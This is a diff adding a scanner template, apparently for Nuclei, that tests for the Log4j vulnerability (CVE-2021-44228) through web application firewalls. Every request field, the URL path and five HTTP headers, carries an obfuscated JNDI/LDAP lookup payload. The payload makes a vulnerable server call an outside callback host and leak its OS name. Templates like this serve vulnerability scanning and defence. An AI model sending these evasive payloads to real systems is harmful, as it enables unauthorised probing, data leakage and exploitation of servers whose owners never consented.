@@ -1,0 +1,42 @@
+id: log4j-waf-bypass
+
+info:
+  name: Log4j Bypass
+  author: NS
+  severity: critical
+  reference: 
+    - https://www.microsoft.com/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/
+    - http://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228
+    - https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a
+  tags: cve2021,Log4j
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//${sys:os.name}.{{interactsh-url}}/s}"
+
+    headers:
+      Host: "{{Host}}"
+      User-Agent: "Mozilla ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//${sys:os.name}.{{interactsh-url}}/s}"
+      Referer: "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//${sys:os.name}.{{interactsh-url}}/s}"
+      X-Forwarded-For: "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//${sys:os.name}.{{interactsh-url}}/s}"
+      X-Api-Version: "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//${sys:os.name}.{{interactsh-url}}/s}"
+      Authentication: "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//${sys:os.name}.{{interactsh-url}}/s}"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: http
+        words:
+          - "http"
+      - type: word
+        part: interactsh_protocol
+        name: dns
+        words:
+          - "dns"
+      - type: word
+        part: interactsh_protocol
+        name: rmi
+        words:
+          - "rmi"
